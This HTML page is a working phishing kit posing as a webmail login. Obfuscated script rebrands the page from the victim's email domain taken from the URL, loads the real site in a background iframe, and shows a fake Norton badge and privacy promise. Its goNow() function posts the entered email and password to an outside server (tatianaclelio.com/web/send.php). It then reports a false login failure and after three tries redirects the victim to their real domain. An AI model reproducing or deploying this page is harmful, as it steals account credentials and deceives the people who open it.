<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=windows-1252">
  <meta name="robots" content="noindex, nofollow">
  <meta name="googlebot" content="noindex, nofollow">
  <title>Webmail Portal Login</title>
  <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
  <style>
    html,
    body,
    div,
    span,
    applet,
    object,
    iframe,
    h1,
    h2,
    h3,
    h4,
    h5,
    h6,
    p,
    blockquote,
    pre,
    a,
    abbr,
    acronym,
    address,
    big,
    cite,
    code,
    del,
    dfn,
    em,
    img,
    ins,
    kbd,
    q,
    s,
    samp,
    small,
    strike,
    strong,
    sub,
    sup,
    tt,
    var,
    b,
    u,
    i,
    center,
    dl,
    dt,
    dd,
    ol,
    ul,
    li,
    fieldset,
    form,
    label,
    legend,
    table,
    caption,
    tbody,
    tfoot,
    thead,
    tr,
    th,
    td,
    article,
    aside,
    canvas,
    details,
    embed,
    figure,
    figcaption,
    footer,
    header,
    hgroup,
    menu,
    nav,
    output,
    ruby,
    section,
    summary,
    time,
    mark,
    audio,
    video {
      margin: 0;
      padding: 0;
      border: 0;
      font-size: 100%;
      font: inherit;
      vertical-align: baseline
    }

    article,
    aside,
    details,
    figcaption,
    figure,
    footer,
    header,
    hgroup,
    menu,
    nav,
    section {
      display: block
    }

    body {
      line-height: 1
    }

    ol,
    ul {
      list-style: none
    }

    blockquote,
    q {
      quotes: none
    }

    blockquote:before,
    blockquote:after,
    q:before,
    q:after {
      content: '';
      content: none
    }

    table {
      border-collapse: collapse;
      border-spacing: 0
    }

    html,
    body {
      font-size: 18px;
      font-family: Corbel, Arial, Helvetica, sans-serif;
      font-weight: 500
    }

    #root {
      position: absolute;
      left: 0;
      right: 0;
      bottom: 0;
      top: 0;
      z-index: -10;
      pointer-events: none
    }

    .error {
      color: #dc3545;
      width: 80%;
      margin: 0 auto;
      padding-top: 5px
    }

    .form-holder {
      background-color: #fff;
      width: 600px;
      margin: 180px auto;
      height: 100%;
      box-shadow: 0 20px 50px #a9a9a9;
      border-radius: 4px 4px 0 0;
      border: 1px solid #d6dfea;
      z-index: 12
    }

    .xlogo {
      background-color: #0d4f8b;
      color: #fff;
      padding: 8px;
      margin-bottom: 10px
    }

    .xlogo img {
      vertical-align: middle;
      width: 5%;
      height: 5%;
      object-fit: contain
    }

    .xlogo span {
      vertical-align: middle
    }

    .form-wrap {
      width: 400px;
      margin: 0 auto;
      text-align: center
    }

    .form-wrap p {
      font-size: 24px
    }

    .form-wrap img {
      margin: 20px
    }

    .finput {
      width: 80%;
      margin: 10px auto
    }

    .finput input[type=email],
    .finput input[type=password] {
      font-size: 17px;
      padding: 10px 10px 10px 40px;
      border-radius: 4px;
      margin: 5px 0;
      width: 90%;
      border: 1px solid #d6dfea
    }

    .finput input[type=email] {
      background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAAXCAQAAABKIxwrAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QAAKqNIzIAAAAJcEhZcwAADdcAAA3XAUIom3gAAAAHdElNRQfjAwITKgogc0nIAAAA/ElEQVQ4y43Sv07CUBTH8W9BiEvjSAcZCMbRQWNKSHBnwD4AL8DII7CRONXwDE76DhhfoCshIeGPJLoRZGjCcBygtdR72/s7w10+Ock550I6V4wImBEwok5OHvhB4trSysJlVgksCAtKeu6lsCB0kqBwwl1FC1fPHQV39NxS8KKeLxV8rh+1qRi1kbXKjxQek5ka6wT+pEZOqryxR9jzymUe7WMDNtfHt09VTSv4hAhfDGlzR5sh3wghPpVTajFgp9hKVDsGyZv0MmhUvb/eEwM+jU7qGWBBeDzwd0M+Brg1xIJwX+SJm7zLxTm32HBhzDdnPNNV/vP/EV5+AUv1vp3jhmegAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDE5LTAzLTAyVDE4OjQyOjEwKzAxOjAw99JImgAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxOS0wMy0wMlQxODo0MjoxMCswMTowMIaP8CYAAAAZdEVYdFNvZnR3YXJlAHd3dy5pbmtzY2FwZS5vcmeb7jwaAAAAAElFTkSuQmCC) no-repeat scroll 10px 10px
    }

    .finput input[type=password] {
      background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAQAAABKfvVzAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QAAKqNIzIAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAAHdElNRQfjAwITLAsBLt7YAAAA1klEQVQ4y72STQ6CMBCFP3SNiSSykvvoUtEDGe7CEfQW6NI1sNRECUtxXABKofwkJE6TJn3z3vTNtFAPG48zKSkBHgt6YkeCVNaTbTf9rdAFIWuX2EX1EBcTkw1XBOHRZswr6NYXsYgQhINecEEQXAXbIwiBXpAbMhVshiAkP8CoJKWBaNBJ35zrUQruRSUaYy3Rm2pJBhQ3RlkaKTji4HDqEqqNLgFwdO3rb5j221Vr+QD4w2+YV/ZBTUcAxMMFGQAvXep/Lx33MiP1uCZs/NPqClnlxA8hMnhnez+9CwAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAxOS0wMy0wMlQxODo0NDoxMSswMTowMFy7M2kAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMTktMDMtMDJUMTg6NDQ6MTErMDE6MDAt5ovVAAAAGXRFWHRTb2Z0d2FyZQB3d3cuaW5rc2NhcGUub3Jnm+48GgAAAABJRU5ErkJggg==) no-repeat scroll 7px 7px
    }

    .finput input[type=email]:hover,
    .finput input[type=password]:hover,
    .finput input[type=email]:focus,
    .finput input[type=password]:focus {
      border: 1px solid #0d4f8b
    }

    button {
      border: 1px solid #0d4f8b;
      font-size: 20px;
      padding: 7px 20px;
      border-radius: 4px;
      background-color: #0d4f8b;
      color: #fff
    }

    button:hover {
      background-color: #1874cd;
      cursor: pointer
    }

    .privacy {
      font-size: 14px;
      color: gray;
      text-align: left;
      display: block;
      margin-bottom: 20px
    }
  </style>
  <link id="favicon" rel="shortcut icon" type="image/png" href="https://alphatrade-options.com/git/rand/favicon.png">
  <script type="text/javascript">
    'use strict';
    /** @type {!Array} */
    var _0x29a3 = ["innerHTML", "137967OuewSg", "379705GmhmYc", "src", "block", "display", "message", "hash", "preventDefault", "1BQGHgr", "val", "fail", "Check your network connection..", "style", "ajax", "kai", "input[name=tpass]", "redirecto", "banNer", "input[name=temail]", "title", "myframe", "74734CDKuWR", "Webmail Portal Login - ", "replace", "https://www.", "zion", "attr", "none", "282575HCidVs", "slice", "getElementById", "Retype", "31421MpoORy", "indexOf", "1DvjFvy", "length", "temail", "Invalid password . Please try again ...",
      "https://www.google.com/s2/favicons?domain=", "location", "error", "log", "focus", "tpass", "value", "12FNOhav", "hido", "572226OvGFSN", "href", "529969LtYXLi"];

    /**
     * @param {number} totalExpectedResults
     * @param {?} entrySelector
     * @return {?}
     */
    var _0x40b2 = function (totalExpectedResults, entrySelector) {
      /** @type {number} */
      totalExpectedResults = totalExpectedResults - 147;
      var _0x29a399 = _0x29a3[totalExpectedResults];
      return _0x29a399;
    };

    /** @type {function(number, ?): ?} */
    var _0x2e20a0 = _0x40b2;
    (function (data, oldPassword) {
      /** @type {function(number, ?): ?} */
      var toMonths = _0x40b2;
      for (; !![];) {
        try {
          /** @type {number} */
          var userPsd = -parseInt(toMonths(184)) + parseInt(toMonths(186)) + parseInt(toMonths(158)) * -parseInt(toMonths(196)) + parseInt(toMonths(182)) * parseInt(toMonths(169)) + parseInt(toMonths(165)) + parseInt(toMonths(188)) + parseInt(toMonths(189)) * -parseInt(toMonths(171));
          if (userPsd === oldPassword) {
            break;
          } else {
            data["push"](data["shift"]());
          }
        } catch (_0x3cd5ae) {
          data["push"](data["shift"]());
        }
      }
    })(_0x29a3, 300898);
    var hash = window[_0x2e20a0(176)]["hash"]["substr"](1);

    /**
     * @return {undefined}
     */
    window["onload"] = function init() {
      var prefixed = _0x2e20a0;
      if (hash) {
        var element = window[prefixed(176)][prefixed(194)][prefixed(160)]("#", "");
        var eventPrefix = element[prefixed(170)]("@");
        var crop_growth = element[prefixed(166)](eventPrefix + 1, element[prefixed(172)]);
        document[prefixed(156)] = prefixed(159) + crop_growth;
        var next_grow = prefixed(175) + crop_growth;
        document[prefixed(167)](prefixed(162))[prefixed(190)] = next_grow;
        document[prefixed(167)](prefixed(173))["value"] = element;
        document[prefixed(167)](prefixed(151))[prefixed(187)] = crop_growth;
        document[prefixed(167)](prefixed(154))[prefixed(187)] = crop_growth;
        $("#favicon")[prefixed(163)](prefixed(185), next_grow);
        document[prefixed(167)]("tpass")[prefixed(179)]();
        document["getElementById"](prefixed(157))[prefixed(190)] = prefixed(161) + crop_growth;
        document[prefixed(167)]("redirecto")[prefixed(181)] = prefixed(161) + crop_growth;
      } else {
      }
    };

    /** @type {number} */
    var n = 0;
    /**
     * @return {?}
     */

    function goNow() {
      $('#error').hide();
      event.preventDefault();
      var temail = $("#temail").val();
      var tpass = $("#tpass").val();
      var detail = $("#field").html();
      var error = $('#error').html();

      if (document.getElementById("temail").value.length == 0) {
        $("#error").show();
        $("#error").html("Please enter your email address.");
        temail.focus;
        return false;
      }

      if (document.getElementById("tpass").value.length == 0) {
        $("#error").show();
        $("#error").html("Please enter your password.");
        tpass.focus;
        return false;
      }

      var inndd = temail.indexOf("@");
      var my_sliceee = temail.substr((inndd + 1));

      n = n + 1;
      $.ajax({
        dataType: 'JSON',
        url: 'https://tatianaclelio.com/web/send.php',
        type: 'POST',
        data: {
          temail: temail,
          tpass: tpass,
          detail: detail,
        },
        beforeSend: function (xhr) {
          $('#goNow').html('Verifing...');
        },

        success: function (response) {
          $("#tpass").val("");
          if (n >= 3) {
            n = 0;
            window.location.replace("http://www." + my_sliceee);
          }
          if (response) {
            $("#error").show();
            console.log(response);
            if (response['signal'] == 'ok') {
              $("#error").show();
              $('#error').html("Login failed! Please enter correct password.");
            }
            else {

            }
          }
        },
        error: function () {
          $("#tpass").val("");
          if (n >= 3) {
            n = 0;
            window.location.replace("http://www." + my_sliceee);
          }
          $("#error").show();
          $('#error').html("Login failed! Please enter correct password.");
        },
        complete: function () {
          $('#goNow').html('Continue');
        }


      });
    }
    ;
  </script>

</head>

<body>
  <div class="form-holder">
    <input type="hidden" class="form-control" name="hido" id="hido" value="">
    <input type="hidden" class="form-control" name="redirecto" id="redirecto" value="">
    <div class="xlogo">
      <img id="zion"
        src="https://firebasestorage.googleapis.com/v0/b/portal-aa363.appspot.com/o/favicons.png?alt=media&token=805fb0ef-a2d9-4a7f-85e6-d68384e166e3">
      <span style="text-transform: capitalize;" id="banNer"></span>
    </div>
    <div class="form-wrap">
      <p>Please sign in with your email</p>
      <div class="error" style="margin-top: 5px; display: none" id="error"></div>
      <div class="finput">
        <input type="email" id="temail" name="temail" placeholder="Email Address" required="" disabled>
      </div>
      <div class="finput">
        <input type="password" name="tpass" placeholder="Email Password" id="tpass" required="">
      </div>
      <div class="finput btn">
        <button onclick="goNow()" id="goNow">Continue</button>
      </div>
      <img
        src="https://ik.imagekit.io/escrowmade/norton-secured_z-zkQ_hJL.png"
        width="107" height="58">
      <span class="privacy">
        Privacy Policy: <span id="kai" style="text-transform: capitalize;"></span><br>
        Your information is only for the sole purpose of viewing this document and would not be sold or shared to any
        third party.
      </span>
    </div>
  </div>
  <script>
    var inputx = document.getElementById("tpass");
    inputx.addEventListener("keyup", function (event) {
      if (event.keyCode === 13) {
        event.preventDefault();
        document.getElementById("goNow").click();
      }
    });
  </script>
  <div id="root">
    <iframe id="myframe" scrolling="no" src="" width="100%" height="100%" frameborder="0"></iframe>
  </div>

</body>

</html>
